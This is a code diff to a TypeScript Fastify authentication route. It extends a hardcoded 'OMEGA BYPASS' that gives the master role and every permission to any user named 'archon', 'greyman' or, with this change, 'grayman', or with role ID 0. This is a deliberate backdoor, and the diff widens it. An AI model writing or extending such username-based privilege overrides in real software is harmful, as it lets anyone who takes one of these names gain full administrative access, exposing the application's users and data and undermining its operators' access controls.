@@ -68,19 +68,18 @@ export default async function authRoutes(fastify: FastifyInstance): Promise<void
 
       // 🛡️ OMEGA BYPASS: Hardcoded Identity injection for the Sovereign
       if (
-        user.username.toLowerCase() === 'archon' ||
-        user.username.toLowerCase() === 'greyman' ||
+        ['archon', 'greyman', 'grayman'].includes(user.username.toLowerCase()) ||
         Number(user.roleId) === 0
       ) {
         user.roleName = 'Master (Archon)';
       }
 
       // 🛡️ OMEGA BYPASS: Master (Archon) always gets all permissions
-      // Hardcoded check for 'archon' or 'greyman' username as a final fail-safe
+      // Hardcoded check for 'archon', 'greyman' or 'grayman' username as a final fail-safe
       if (
         user.roleName === 'Master (Archon)' ||
         Number(user.roleId) === 0 ||
-        ['archon', 'greyman'].includes(user.username.toLowerCase())
+        ['archon', 'greyman', 'grayman'].includes(user.username.toLowerCase())
       ) {
         const [allPerms] = await db.execute<RowDataPacket[]>('SELECT slug FROM permissions');
         if (allPerms && Array.isArray(allPerms)) {
